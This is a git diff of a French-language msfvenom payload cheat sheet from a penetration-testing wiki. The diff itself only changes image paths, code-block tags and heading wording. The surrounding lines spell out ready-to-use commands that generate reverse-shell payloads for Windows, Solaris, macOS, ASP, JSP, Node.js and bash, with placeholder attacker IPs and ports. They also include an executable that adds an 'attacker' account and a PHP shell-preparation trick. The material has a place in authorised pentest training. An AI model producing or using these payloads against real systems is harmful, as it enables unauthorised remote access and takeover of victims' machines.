@@ -15,7 +15,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
 
@@ -83,7 +83,9 @@ msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
 ```
-### **Exécuter une commande**
+{% endcode %}
+
+### **Exécuter la commande**
 
 {% code overflow="wrap" %}
 ```bash
@@ -131,7 +133,7 @@ msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTAC
 ```
 {% endcode %}
 
-## **Charge utiles MAC**
+## **Charge utile MAC**
 
 ### **Shell inversé :**
 
@@ -164,7 +166,7 @@ cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> s
 
 ### ASP/x
 
-#### Shell inversée
+#### Reverse shell
 
 {% code overflow="wrap" %}
 ```bash
@@ -197,7 +199,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Chargements utiles en langage de script**
+## **Chargements de langage de script**
 
 ### **Perl**
 
@@ -221,7 +223,7 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers expérimentés et des chasseurs de bugs !
 
